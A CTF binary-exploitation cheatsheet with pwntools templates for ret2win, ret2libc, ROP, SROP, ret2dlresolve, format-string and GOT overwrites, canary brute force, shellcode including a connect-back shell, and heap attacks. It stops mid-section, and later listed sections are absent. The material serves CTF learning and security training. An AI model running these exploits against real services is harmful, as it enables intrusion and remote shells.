# PWN / Binary Exploitation Cheatsheet

> **Usage:** Replace `<BINARY>`, `<IP>`, `<PORT>` with your values. All commands assume Kali/Linux attacker machine with pwntools installed.

---

## Table of Contents
1. [Phase 0 — Environment Setup & Local Libc Matching](#phase-0--environment-setup--local-libc-matching)
2. [Phase 1 — Recon & Protections](#phase-1--recon--protections)
3. [Phase 2 — Find Functions & Strings](#phase-2--find-functions--strings)
4. [Phase 3 — Disassemble Key Functions](#phase-3--disassemble-key-functions)
5. [Phase 4 — Identify the Vulnerability Class](#phase-4--identify-the-vulnerability-class)
6. [Phase 5 — Calculate the Offset](#phase-5--calculate-the-offset)
7. [Phase 6 — Verify with Crash Test](#phase-6--verify-with-crash-test)
8. [Phase 7 — Build the Exploit](#phase-7--build-the-exploit)
9. [Common Stack Exploit Patterns](#common-stack-exploit-patterns)
10. [Stack Canary — Bypass Techniques](#stack-canary--bypass-techniques)
11. [PIE / ASLR — Leaks & Partial Overwrite](#pie--aslr--leaks--partial-overwrite)
12. [Stack Alignment Fix](#stack-alignment-fix)
13. [Stack Pivoting](#stack-pivoting)
14. [ROP Chains](#rop-chains)
15. [ret2dlresolve](#ret2dlresolve)
16. [SROP — Sigreturn-Oriented Programming](#srop--sigreturn-oriented-programming)
17. [Shellcode Injection](#shellcode-injection)
18. [Seccomp-Restricted Binaries (orw chains)](#seccomp-restricted-binaries-orw-chains)
19. [Format String Attacks](#format-string-attacks)
20. [GOT Overwrite](#got-overwrite)
21. [ret2libc](#ret2libc)
22. [Heap Exploitation](#heap-exploitation)
23. [Integer Bugs → Memory Corruption](#integer-bugs--memory-corruption)
24. [Race Conditions / TOCTOU](#race-conditions--toctou)
25. [Pwntools Reference](#pwntools-reference)
26. [GDB Cheatsheet](#gdb-cheatsheet)
27. [MIPS-Specific Notes](#mips-specific-notes)
28. [Windows Pwn — Quick Notes](#windows-pwn--quick-notes)
29. [Challenge Triage Flowchart](#challenge-triage-flowchart)
30. [Tool Installation](#tool-installation)

---

## Phase 0 — Environment Setup & Local Libc Matching

**Do this before anything else.** Testing against the wrong libc version wastes hours — offsets, gadget addresses, and even struct layouts (tcache, malloc chunk headers) differ between glibc versions.

### If the challenge provides `libc.so.6` / `ld-linux.so`
```bash
# pwninit automates this whole section — installs, patches, and generates a solve.py skeleton
pip install pwninit  # or download the binary release from GitHub
pwninit
```

Manually, if `pwninit` isn't available:
```bash
# Make the binary use the provided libc instead of the system one
patchelf --set-interpreter ./ld-linux-x86-64.so.2 <BINARY>
patchelf --replace-needed libc.so.6 ./libc.so.6 <BINARY>
chmod +x ld-linux-x86-64.so.2 libc.so.6

# Verify it's linked correctly
ldd <BINARY>

# Run/debug locally with matching libc — now GDB and pwntools see the exact
# same offsets the remote server uses
```

Alternative without patching (quick local test only):
```bash
./ld-linux-x86-64.so.2 --library-path . ./<BINARY>
```

### Identify libc version if not provided
```bash
strings libc.so.6 | grep "GNU C Library"
# or check the .comment section
readelf -p .comment libc.so.6

# If you only have leaked addresses (e.g. via puts), search a libc database:
# https://libc.rip/          (upload 2-3 leaked function addresses, get matching libc)
# https://libc.blukat.me/
```

### pwntools libc-database (local matching, no internet needed at solve time)
```bash
git clone https://github.com/niklasb/libc-database
cd libc-database && ./get all   # downloads a large local libc collection (slow, one-time)

./find puts 0x7f1234567890       # search by one leaked symbol address
./find system 0x... printf 0x... # search by multiple leaked symbols (higher accuracy)
```

---

## Phase 1 — Recon & Protections

**Goal:** Determine architecture, endianness, and which protections are enabled. This dictates your entire exploit strategy.

```bash
file <BINARY>
checksec --file=<BINARY>
python3 -c "from pwn import *; ELF('<BINARY>')"
```

### Protection Cheat Table

| Protection | Enabled | Meaning | Exploit Impact |
|-----------|---------|---------|----------------|
| **PIE** | No PIE | Addresses are fixed | Can hardcode function addresses |
| **PIE** | PIE enabled | Base address randomized | Need info leak first, then calculate offsets |
| **NX** | NX enabled | Stack not executable | Can't run shellcode on stack — use ROP or existing functions |
| **NX** | NX disabled | Stack is executable | Can inject and execute shellcode directly |
| **Canary** | No canary | No stack corruption detection | Buffer overflow goes undetected |
| **Canary** | Canary found | Random value guards return address | Need to leak canary first, or find a write-what-where |
| **RELRO** | No RELRO | GOT fully writable, even function pointers before resolution | Easiest GOT overwrite |
| **RELRO** | Partial | GOT is writable | Can overwrite GOT entries |
| **RELRO** | Full | GOT is read-only (resolved at load time) | Can't overwrite GOT — use other techniques |
| **FORTIFY** | Enabled | `_chk` variants of unsafe functions (`__strcpy_chk`, etc.) | Adds size checks to some calls; doesn't stop logic bugs |
| **Stripped** | No | Symbol names present | Can see function names in disassembly |
| **Stripped** | Yes | No symbol names | Must identify functions manually by behavior/xrefs |

### Quick Decision After Recon

```
No PIE + No Canary + NX enabled  → ret2win / ROP (most common CTF setup)
No PIE + No Canary + NX disabled → shellcode injection
PIE enabled + No Canary          → need leak, then ret2win / ROP
Any + Canary                     → need canary leak (format string / info leak / brute force) or a bug that skips the canary check entirely (e.g. direct write primitive, heap bug)
Uses malloc/free heavily          → probably a heap challenge regardless of the above — check Section 22 first
seccomp / prctl in binary         → syscalls are restricted, standard ret2libc/shell payloads won't work — see Section 18
```

---

## Phase 2 — Find Functions & Strings

**Goal:** Find win functions, dangerous functions, and interesting strings.

### List All Functions
```bash
objdump -t <BINARY> | grep "\.text" | awk '{print $NF, $1}'
readelf -s <BINARY> | grep FUNC | awk '{print $8, $2}'

python3 -c "
from pwn import *
elf = ELF('<BINARY>', checksec=False)
for name in sorted(elf.functions):
    print(f'  {name}: {hex(elf.functions[name].address)}')
"
```

### Extract Strings
```bash
strings <BINARY>
strings <BINARY> | grep -iE "flag|shell|/bin|win|secret|exec|system|cat|sh$"
strings -t x <BINARY> | grep -iE "flag|shell|/bin|win"
```

### Check for a seccomp filter (restricts allowed syscalls)
```bash
# seccomp-tools shows the exact BPF filter and which syscalls are allowed/blocked
seccomp-tools dump ./<BINARY>
```
If present, jump to [Section 18](#seccomp-restricted-binaries-orw-chains) — `system("/bin/sh")` and `execve` are commonly blocked and you'll need an open/read/write chain instead.

### What to Look For

**Win function indicators:**
- Function names: `win`, `shell`, `flag`, `bell`, `success`, `backdoor`, `secret`, `getflag`
- String references: `/bin/sh`, `/bin/bash`, `flag.txt`, `cat flag`, `system`
- PLT entries: `system`, `execl`, `execve`, `execvp`

**Dangerous input/copy functions (vulnerability sources):**
- `gets` — always overflows (no size limit), removed from modern glibc but still shows up in CTF binaries
- `scanf("%s", ...)` / `sscanf` — no size limit
- `read(fd, buf, size)` — overflow if size > buffer
- `strcpy` / `strcat` — no bounds checking
- `sprintf` — no bounds checking (`snprintf` is the safe version)
- `fgets(buf, size, stdin)` — safe IF size ≤ buffer (check both values — off-by-one here is common: `fgets(buf, size+1, stdin)`)
- `memcpy(dst, src, n)` where `n` is attacker-controlled — classic heap/stack overflow vector
- `printf(user_input)` (no format string literal) — format string bug
- `malloc`/`free`/`realloc` used with attacker-influenced sizes, or freed pointers not nulled — heap bug candidates

---

## Phase 3 — Disassemble Key Functions

**Goal:** Understand what each function does, find the vulnerability, and identify the win target.

### Using objdump
```bash
objdump -d <BINARY> | less
objdump -d <BINARY> | grep -A 50 "<main>:"
objdump -d -M intel <BINARY> | grep -A 50 "<main>:"
```

### Using Ghidra (Best for Complex Binaries)
```bash
# Install: apt install ghidra
ghidra    # Import binary → Auto-analyze → View decompiler
```
- Gives pseudo-C code — much easier than reading assembly
- Shows variable types, buffer sizes, function calls
- Right-click → "References to" to trace data flow
- For heap challenges: watch `malloc`/`free` call sites and trace which struct/chunk each pointer belongs to

### Using pwntools + capstone
```python
from pwn import *
from capstone import *

elf = ELF('<BINARY>', checksec=False)
data = open('<BINARY>', 'rb').read()
md = Cs(CS_ARCH_X86, CS_MODE_64)  # or CS_MODE_32 for 32-bit

func = elf.functions['main']
offset = func.address - elf.address
func_bytes = data[offset:offset+func.size]

for insn in md.disasm(func_bytes, func.address):
    print(f"  {hex(insn.address)}: {insn.mnemonic}\t{insn.op_str}")
```

### Reading Disassembly — What to Look For

**In the win function — confirm it gives shell/flag:**
```asm
lea rdi, [rip + 0x...]    ; loads string address (first argument)
call system               ; system("/bin/sh")
call execl                ; execl("/bin/sh", ...)
call execve               ; execve("/bin/sh", ...)
```

**In main/vulnerable function — find the overflow:**
```asm
sub rsp, 0x20             ; allocates 32 bytes on stack
lea rax, [rbp - 0x20]     ; buffer at rbp-0x20 (32 bytes from RBP)
mov rsi, rax              ; second arg to read() = buffer pointer
mov edx, 0x60             ; third arg to read() = 96 bytes
call read                 ; reads 96 into 32-byte buffer → OVERFLOW
```
or
```asm
lea rdi, [rbp - 0x40]
call gets                 ; unlimited read → OVERFLOW
```

---

## Phase 4 — Identify the Vulnerability Class

### Buffer Overflow Detection

| Value | Where to Find | Example |
|-------|--------------|---------|
| Buffer size | `sub rsp, 0xXX` or `lea reg, [rbp - 0xXX]` | `[rbp - 0x20]` → 32 bytes |
| Read size | `mov edx, 0xXX` before `call read` | `0x60` → 96 bytes |
| Input function | `call gets/read/scanf/fgets` | `call read` |

**Overflow exists when:** `read_size > buffer_size`

### Vulnerability Class Quick Reference

```
gets()                       → always vulnerable, unlimited read
scanf("%s", buf)             → always vulnerable, no size limit
strcpy(dst, src)              → overflow if src > dst
printf(user_input)           → format string vulnerability (no format specifier as 1st arg)
read(0, buf, n)               → overflow if n > buffer size
fgets(buf, size, stdin) with off-by-one size → single NUL/byte overflow, often enough to corrupt a size field or canary's low byte
malloc(user_controlled_size)  → integer overflow if size calc wraps; heap challenge
free(ptr) without nulling ptr → use-after-free candidate — check if ptr is reused anywhere after
free(ptr); free(ptr) again    → double-free candidate
Two allocations, overlapping write → heap overflow into adjacent chunk
Signed/unsigned size comparison → integer bug (see Section 23)
```

**Triage rule:** if the binary's core logic revolves around a menu with add/edit/delete/view on heap-allocated structures ("heap note", "chunk shop", etc.), it's a heap challenge — go straight to [Section 22](#heap-exploitation) rather than looking for a stack overflow.

---

## Phase 5 — Calculate the Offset

### x86-64 (64-bit) Stack Layout
```
Low addresses
┌──────────────────┐
│   local vars      │ ← rsp (stack pointer)
│   ...             │
│   buffer[0..N]    │ ← rbp - buffer_size
├──────────────────┤
│  [canary, if any] │ ← present between buffer and saved RBP if -fstack-protector
├──────────────────┤
│   saved RBP       │ ← rbp (8 bytes on 64-bit, 4 on 32-bit)
├──────────────────┤
│   return address   │ ← rbp + 8  *** THIS IS THE TARGET (no canary) ***
├──────────────────┤
│   caller frame    │
└──────────────────┘
High addresses
```

### Formula (no canary present)
```
x86-64:  OFFSET = buffer_size + 8   (8 bytes for saved RBP)
x86-32:  OFFSET = buffer_size + 4   (4 bytes for saved RBP/EBP)
```
If a canary **is** present, your padding must be `buffer_size_to_canary` bytes, then overwrite the canary with its **correct leaked value** (never brute-force blindly if you can leak it — see Section 10), then 8 more bytes for saved RBP, then your target.

### Examples
```
Buffer at [rbp - 0x20] (32 bytes), no canary:   OFFSET = 32 + 8 = 40
Buffer at [rbp - 0x40] (64 bytes), no canary:   OFFSET = 64 + 8 = 72
```

### Verify Read Size Covers the Return Address
```
Need: read_size >= OFFSET + 8
Example: read_size=96, OFFSET=40 → 96 >= 48 ✓
```

---

## Phase 6 — Verify with Crash Test

### Method 1: Cyclic Pattern (Recommended)
```python
from pwn import *
context.arch = 'amd64'
p = process('./<BINARY>')
payload = cyclic(200)
p.sendlineafter(b'prompt> ', payload)
p.wait()
```

### Method 2: GDB
```bash
gdb ./<BINARY>
run
# send: python3 -c "from pwn import *; print(cyclic(200).decode())"
# after crash:
info registers rip        # 64-bit
info registers eip        # 32-bit
```
```python
from pwn import *
print(cyclic_find(0x6161616b))  # exact offset from the crashed value
```

### Method 3: Simple A's
```bash
python3 -c "print('A'*40 + 'BBBBBBBB')" | ./<BINARY>
# crashes with RIP=0x4242424242424242 → offset is 40
```

---

## Phase 7 — Build the Exploit

### Basic ret2win (No PIE, No Canary)
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

WIN = 0x40176d
OFFSET = 40

# p = process('./<BINARY>')
p = remote('<IP>', <PORT>)

p.recvuntil(b'> ')
payload = b'A' * OFFSET
payload += p64(WIN)
p.sendline(payload)
p.interactive()
```

### For 32-bit Binaries
```python
context.arch = 'i386'
payload = b'A' * OFFSET
payload += p32(WIN)
payload += p32(0xdeadbeef)  # dummy return address after win
payload += p32(0xcafebabe)  # 1st arg to win
payload += p32(0xfeedface)  # 2nd arg to win
```

---

## Common Stack Exploit Patterns

### Pattern 1: ret2win (Direct Jump)
```python
payload = b'A' * OFFSET + p64(WIN_ADDR)
```

### Pattern 2: ret2win with Arguments (64-bit)
```python
POP_RDI = 0x401234    # pop rdi; ret
payload = b'A' * OFFSET
payload += p64(POP_RDI)
payload += p64(0xdeadbeef)
payload += p64(WIN_ADDR)
```

### Pattern 3: ret2win with Arguments (32-bit)
```python
payload = b'A' * OFFSET
payload += p32(WIN_ADDR)
payload += p32(0x41414141)   # dummy return after win
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
```

### Pattern 4: ret2system
```python
elf = ELF('<BINARY>')
SYSTEM = elf.plt['system']
BIN_SH = next(elf.search(b'/bin/sh'))
POP_RDI = 0x401234
RET = 0x40101a

payload = b'A' * OFFSET
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(SYSTEM)
```

### Pattern 5: ret2libc (ASLR Bypass)
```python
elf = ELF('<BINARY>')
POP_RDI = 0x401234
RET = 0x40101a

payload1 = b'A' * OFFSET
payload1 += p64(RET)
payload1 += p64(POP_RDI)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

p.sendline(payload1)
leaked = u64(p.recv(6).ljust(8, b'\x00'))

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked - libc.symbols['puts']

payload2 = b'A' * OFFSET
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
```

---

## Stack Canary — Bypass Techniques

A stack canary is a random value placed between local buffers and saved RBP/return address, checked before the function returns. If corrupted, the program calls `__stack_chk_fail` and aborts.

**Key property:** the canary always ends in a **null byte** (`0x00......`), so it can't be leaked/printed by a naive `%s`-style string read (the NUL terminates it) — this is intentional, to block simple `strcpy` overreads from leaking it directly as a string, though other leak types don't have this limitation.

### Technique 1 — Format string leak
If a `%p`/`%x`-style format string bug exists anywhere before the vulnerable function, leak the canary's stack slot directly:
```python
# find the canary's positional offset, then:
p.sendline(b'%15$p')   # example offset — enumerate to find it
canary = int(p.recvline(), 16)
```

### Technique 2 — Byte-by-byte brute force (fork server only)
Works when the target process **forks per connection** (so the canary is identical across connections/attempts within that fork) — common in CTF services via `xinetd`/`socat -f`/explicit `fork()`.
```python
canary = b'\x00'  # first byte is always null
for i in range(1, 8):
    for guess in range(256):
        test_canary = canary + bytes([guess])
        p = remote(HOST, PORT)
        payload = b'A' * OFFSET + test_canary
        p.sendline(payload)
        if b'crash_indicator' not in p.recvall():  # no crash = correct byte
            canary += bytes([guess])
            break
        p.close()
```
Pwntools automates this pattern well with `p.recvall(timeout=...)` checks — expect ~256*8 connections worst case (fast in practice since fork servers rarely rate-limit).

### Technique 3 — Overwrite without touching the canary
If your write primitive is a heap/arbitrary write rather than a linear stack overflow, you may be able to overwrite the return address or a function pointer directly **without passing through the canary's memory location at all** — always check whether the actual bug lets you skip it entirely before assuming you need to leak it.

### Technique 4 — Leak via uninitialized memory / previous read
Some challenges read into a buffer twice, or leave the canary readable in memory that a `print` function later touches (e.g., printing an oversized "name" field that happens to include adjacent stack memory) — treat any info leak in the binary as a possible canary leak, not just explicit format strings.

---

## PIE / ASLR — Leaks & Partial Overwrite

PIE randomizes the binary's own base address at each run; ASLR randomizes libc/stack/heap bases. Both are randomized only at page granularity — **the low 12 bits of any address stay constant** across runs. This is directly exploitable.

### Technique 1 — Partial overwrite (no leak needed)
If you only need to redirect execution to somewhere **within the same binary/library** (e.g., back a few bytes to hit a different code path, or to a `system`-adjacent offset within the same loaded object), you can overwrite just the **last 1–2 bytes** of a saved return address/pointer. Since the low byte(s) aren't randomized by ASLR, a 1-byte overwrite has a 100% success rate and a 2-byte overwrite works, on average, on the first or second attempt (only the 3rd byte affects the "page", and even that is often guessable/limited range).
```python
# Overwrite only the last byte of a return address to redirect within the same function/binary
payload = b'A' * OFFSET
payload += p8(0x16)   # only clobber the low byte, leave the rest of the original return address intact
```

### Technique 2 — Leak via GOT/PLT before triggering the overflow
Same pattern as the ret2libc leak in Section 9, Pattern 5 — leak a libc or PIE-binary address via `puts(GOT_entry)` in a first-stage payload, calculate the real base, then build your real payload with correct absolute addresses in a second stage.

### Technique 3 — Leak via format string
If a format string bug exists anywhere, `%p` over enough stack slots will usually surface a saved return address or a libc pointer sitting on the stack (e.g., from `__libc_start_main`) that you can subtract a known offset from to get the libc/binary base.

### Calculating base from a leak
```python
leaked_addr = 0x7f1234567890          # e.g., leaked puts() address
libc.address = leaked_addr - libc.symbols['puts']   # libc base
# or for PIE binary base:
elf.address = leaked_addr - elf.symbols['some_func']
```

---

## Stack Alignment Fix

**Problem:** On x86-64, `system()` and some libc functions require the stack to be 16-byte aligned when called. If your payload crashes with a SIGSEGV inside a `movaps` instruction, this is the issue.

```bash
ROPgadget --binary <BINARY> | grep ": ret$"
```
```python
RET = 0x40101a  # any "ret" gadget
payload = b'A' * OFFSET + p64(RET) + p64(WIN)
```
**Rule:** If your exploit segfaults but the address is correct, try adding `p64(RET)` before the target.

---

## Stack Pivoting

**When:** your overflow is too small to fit a full ROP chain (e.g., only 16–24 bytes of overflow room past the return address), but you control a larger buffer elsewhere (heap, `.bss`, a global array).

**Idea:** instead of overflowing the stack with your whole chain, overwrite the return address with a `leave; ret` gadget (or a `pop rsp; ret` / `pop rbp; ret` gadget) that redirects `rsp` to point into your controlled buffer, where the *real*, larger ROP chain lives.

```python
# Example using leave;ret — sets rsp = rbp, then pops the new "saved rbp" into rbp and returns
LEAVE_RET = 0x401235   # leave; ret
FAKE_STACK = 0x404060  # a writable, attacker-controlled buffer (e.g. .bss)

# Stage 1: write your full ROP chain into FAKE_STACK via a normal write primitive (e.g. `read` into .bss)
p.send(rop_chain_bytes)   # sent to whatever function writes into FAKE_STACK

# Stage 2: small stack overflow that sets rbp = FAKE_STACK - 8, then hits leave;ret
payload = b'A' * OFFSET
payload += p64(FAKE_STACK - 8)   # becomes the new rbp
payload += p64(LEAVE_RET)        # leave (rsp=rbp; pop rbp) ; ret -> pops from FAKE_STACK
p.sendline(payload)
```
`pwntools` `ROP.migrate(new_stack_addr)` automates building this if you're using the `ROP` class.

---

## ROP Chains

### Finding Gadgets
```bash
ROPgadget --binary <BINARY>
ROPgadget --binary <BINARY> | grep "pop rdi"
ROPgadget --binary <BINARY> | grep ": ret$"
ropper --file <BINARY> --search "pop rdi"
```
```python
from pwn import *
elf = ELF('<BINARY>')
rop = ROP(elf)
print(rop.dump())
```

### x86-64 Calling Convention
```
Argument 1: rdi   Argument 4: rcx
Argument 2: rsi   Argument 5: r8
Argument 3: rdx   Argument 6: r9
Return value: rax
```

### Building a ROP Chain with Pwntools
```python
elf = ELF('<BINARY>')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
payload = b'A' * OFFSET + rop.chain()
```

---

## ret2dlresolve

**When:** No libc leak is possible, no `system`/`/bin/sh` gadget available, and you can't get an info leak of any kind — but you still control enough of a ROP chain to call the dynamic linker's own resolver.

**Idea:** Forge a fake symbol table entry and trigger `_dl_runtime_resolve` to resolve and call an arbitrary libc function (typically `system`) by name, entirely using addresses/offsets already known from the binary itself (no ASLR-dependent values needed) — this works because the binary's own `.dynamic`/`.dynstr`/`.rela.plt` structures are at fixed, non-randomized (or PIE-relative, still computable) offsets.

```python
from pwn import *

elf = ELF('<BINARY>')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)     # write the fake symbol data into a writable section
rop.ret2dlresolve(dlresolve)

payload = b'A' * OFFSET
payload += rop.chain()
p.sendline(payload)
p.sendline(dlresolve.payload)        # send the fake symbol/string data pwntools built
p.interactive()
```
`pwntools`' `Ret2dlresolvePayload` handles the fake `Elf64_Sym`/`Elf64_Rela` construction for you — this is one of the more finicky techniques to build by hand, always prefer the pwntools helper.

---

## SROP — Sigreturn-Oriented Programming

**When:** You have a single `syscall; ret` (or even just a way to trigger `sigreturn`) gadget available and control enough stack space to place an entire fake `sigcontext`/`ucontext` structure — this lets you set **every register** in one shot, including `rax` (syscall number), without needing individual `pop` gadgets for each register.

**How it works:** The `rt_sigreturn` syscall (invoked when a signal handler returns) restores the entire CPU register state from a structure on the stack. If you can get the kernel to invoke `sigreturn` (via a `syscall` instruction with `rax=15`, or a signal actually being delivered), you fully control `rax`, `rdi`, `rsi`, `rdx`, `rsp`, `rip`, etc. in a single gadget use — extremely powerful when gadget selection is otherwise sparse (common in short, static, or heavily-stripped binaries).

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('<BINARY>')
p = process('./<BINARY>')

syscall_ret = 0x401234  # address of a bare `syscall; ret` gadget (or int 0x80; ret on 32-bit)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = next(elf.search(b'/bin/sh\x00'))
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = b'A' * OFFSET
payload += p64(syscall_ret)   # first syscall: rax=15 (sigreturn) triggered via prior setup
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Note: getting `rax=15` set correctly to trigger `sigreturn` itself usually requires either a preceding `pop rax; ret` gadget or exploiting the fact that some functions (like a signal handler naturally returning) call it implicitly — read the specific challenge's gadget set carefully before assuming a bare template will work.

---

## Shellcode Injection

**When:** NX is disabled (stack executable), no canary.

```python
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())

BUF_ADDR = 0x7fffffffe000  # find via GDB

payload = shellcode
payload += b'\x90' * (OFFSET - len(shellcode))
payload += p64(BUF_ADDR)
```

### Common Shellcodes (pwntools)
```python
shellcraft.sh()
shellcraft.cat('/flag.txt')
shellcraft.connect('IP', PORT) + shellcraft.dupsh()
```

---

## Seccomp-Restricted Binaries (orw chains)

**When:** `seccomp-tools dump ./<BINARY>` shows a filter blocking `execve`/`execveat` (common in "no system for you" challenges). You typically still have `open`, `read`, `write`, `openat` available — enough to read `flag.txt` off disk and print it, without ever spawning a shell.

```bash
seccomp-tools dump ./<BINARY>   # confirm exactly which syscalls are allowed
```

### Manual open-read-write shellcode
```python
from pwn import *
context.arch = 'amd64'

shellcode = asm(f'''
    mov rax, 0x67616c662f      ; "flag/" - build path string on stack (reversed order, adjust to actual flag path)
    push rax
    mov rdi, rsp               ; filename pointer
    xor rsi, rsi                ; O_RDONLY
    xor rdx, rdx
    mov rax, {constants.SYS_open}
    syscall

    mov rdi, rax                ; fd from open()
    mov rsi, rsp
    sub rsi, 0x100               ; buffer to read into
    mov rdx, 0x100
    mov rax, {constants.SYS_read}
    syscall

    mov rdi, 1                   ; stdout
    mov rsi, rsp
    sub rsi, 0x100
    mov rdx, 0x100
    mov rax, {constants.SYS_write}
    syscall
''')
```
In practice, `pwntools`' built-in helper does this for you cleanly:
```python
shellcode = asm(shellcraft.open('flag.txt', 0) + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))
```
If shellcode injection isn't available (NX enabled), build the equivalent as a ROP chain calling `open`/`read`/`write` via `syscall` gadgets and `pop` gadgets for arguments instead — same open/read/write logic, just via ROP instead of raw shellcode.

---

## Format String Attacks

**When:** Program does `printf(user_input)` instead of `printf("%s", user_input)`.

### Detection
```bash
echo '%x.%x.%x.%x.%x.%x' | ./<BINARY>   # prints hex values → format string vuln
echo '%p.%p.%p.%p.%p.%p' | ./<BINARY>   # prints stack pointers
```

### Finding your input's stack offset
```python
for i in range(1, 30):
    p = process('./<BINARY>')
    p.sendline(f'AAAA%{i}$x'.encode())
    result = p.recvall()
    if b'41414141' in result:
        print(f'Input starts at offset {i}')
        break
    p.close()
```

### Leaking arbitrary memory (direct parameter access)
```python
# %N$s reads the pointer at stack position N and treats it as a string to print
p.sendline(f'%{offset}$s'.encode())
```

### Arbitrary write with `%n` / `fmtstr_payload`
`%n` writes the number of bytes printed so far to the address pointed to by the corresponding argument. Building this by hand (splitting into `%hn`/`%hhn` writes for partial-width control) is tedious and error-prone — always use pwntools' automated payload builder:
```python
payload = fmtstr_payload(offset, {target_addr: value_to_write})
p.sendline(payload)
```
This handles byte-ordering, width specifiers (`%hhn` for single bytes, `%hn` for two bytes), and padding automatically, and is the standard approach for both stack canary leaks and GOT/arbitrary writes via format string bugs.

---

## GOT Overwrite

**When:** No RELRO or Partial RELRO (GOT is writable).

```python
elf = ELF('<BINARY>')
# Overwrite puts' GOT entry with win's address — next call to puts() actually calls win()
payload = fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})
```
With a heap/arbitrary-write primitive instead of a format string, the same idea applies: write `win_addr`/`system_addr` directly into the target function's GOT slot.

---

## ret2libc

### Step 1: Identify Libc Version
```bash
# From two leaked function addresses, search:
# https://libc.rip/
# https://libc.blukat.me/
# or use libc-database locally (see Phase 0)
```

### Step 2: Find Offsets in Libc
```bash
strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E " system| puts"
```

### Step 3: One-Gadget (Fastest ret2libc)
```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0, rcx == NULL
```
```python
payload = b'A' * OFFSET + p64(libc.address + ONE_GADGET)
```
**Note:** one_gadget addresses have constraints (register/memory conditions) — if the shell doesn't spawn, try each candidate gadget in turn; the first one isn't always satisfiable in your specific stack state.

---

## Heap Exploitation

Heap challenges are their own category with different mental models than stack overflows — no return address to hit, instead you're corrupting **allocator metadata** or exploiting **logic bugs around allocation lifetime** to eventually get an arbitrary write, then pivot that into a GOT overwrite or `__free_hook`/`__malloc_hook`-style hijack (pre-2.34 glibc) or `exit` handler / `_IO_FILE` structure abuse (2.34+, since hooks were removed).

### Identifying a heap challenge
Menu-driven binaries with `add/create`, `edit/update`, `delete/free`, `show/view` on named "notes", "chunks", or "items" backed by `malloc`/`free`. Always check glibc version first — technique availability differs hugely by version:
- **< 2.26**: no tcache, fastbin/unsorted-bin attacks dominate
- **2.26 – 2.28**: tcache introduced, but no tcache double-free/count protections yet — tcache poisoning is trivial
- **2.29 – 2.31**: tcache `key` field added (detects same-chunk double-free, but not cross-chunk)
- **2.32+**: **safe-linking** added — `fd` pointers in tcache/fastbin are now mangled (XORed with a shifted address), raising the bar for pointer forgery
- **2.34+**: `__malloc_hook`/`__free_hook` **removed entirely** — hook-based techniques no longer work; must target `_IO_FILE` vtables, `exit` handler arrays (`__exit_funcs`), or GOT instead

### Core chunk anatomy (glibc malloc)
```
Each chunk in memory:
+----------------+
| prev_size (if prev chunk is free) |
+----------------+
| size | flags (PREV_INUSE/IS_MMAPPED/NON_MAIN_ARENA in low 3 bits) |
+----------------+
| user data ...  |   <- pointer returned by malloc() points here
| (fd, bk if free) |   <- when freed, first 16 bytes reused as freelist pointers
+----------------+
```
`malloc(x)` actually returns `chunk_addr + 0x10` (on 64-bit) — always account for this header offset when calculating overflow targets or forging fake chunks.

### Use-After-Free (UAF)
**Pattern:** a pointer is `free()`'d but the program later reads/writes through it anyway (dangling reference not nulled).
**Exploit:** the freed chunk's memory is still logically "yours" until reallocated. Free it, let it land in a freelist (tcache/fastbin), then either:
- Read through the stale pointer to leak freelist `fd` pointers (which, pre-safe-linking, are raw heap/libc addresses — instant leak), or
- Allocate a new chunk of the same size (reusing the same memory) and overwrite it via the *new* pointer while still reading it via the *old*, dangling one — classic type confusion.

### Double-Free
**Pattern:** the same pointer is passed to `free()` twice without being reallocated in between (or the program fails to null it after the first free).
**Exploit (pre-2.29 tcache, no `key` check):**
```
free(chunk_A)
free(chunk_A)          # tcache freelist now: chunk_A -> chunk_A -> chunk_A -> ...
malloc(size)            # returns chunk_A
edit(chunk_A, fake_fd)  # overwrite chunk_A's fd pointer to point anywhere
malloc(size)            # returns chunk_A again
malloc(size)            # returns YOUR FORGED ADDRESS — arbitrary allocation location!
```
This is **tcache poisoning** — the single most common modern heap CTF technique. Once you can get `malloc` to return an address of your choosing, you overwrite whatever lives there (a GOT entry, `__free_hook`, a function pointer struct, etc.).

On 2.29+, the tcache `key` field (set to the tcache-perthread-struct's own address on free) blocks the *naive* same-chunk-twice-in-a-row double free — you need either a UAF to reset the key between frees, or to alternate frees between two different chunks (`free(A); free(B); free(A)`) which the key check doesn't catch.

### Fastbin Dup (older glibc, no tcache, or exhausted tcache)
Same core idea as tcache poisoning but operating on the fastbin freelist instead — requires the classic `free(A); free(B); free(A)` pattern (single-chunk-twice-in-a-row IS checked even in fastbins) and a size-appropriate fake chunk with a valid-looking `size` field to pass fastbin's sanity checks.

### House of Force
**Pattern:** an overflow lets you corrupt the size field of the **top chunk** (the wilderness — glibc's "infinite" chunk at the end of the heap that services requests when no freed chunk fits).
**Exploit:** set the top chunk's size to a huge value (e.g., `0xffffffffffffffff`), then request an allocation with a carefully calculated size such that `top_chunk_addr + requested_size` lands exactly on your target address (GOT entry, hook, stack, etc.) — the next `malloc` call effectively becomes an arbitrary-address allocator.

### Unsorted Bin Attack
**Pattern:** you can corrupt a freed chunk sitting in the unsorted bin (chunks land here temporarily after being freed, before being resorted into size-specific bins).
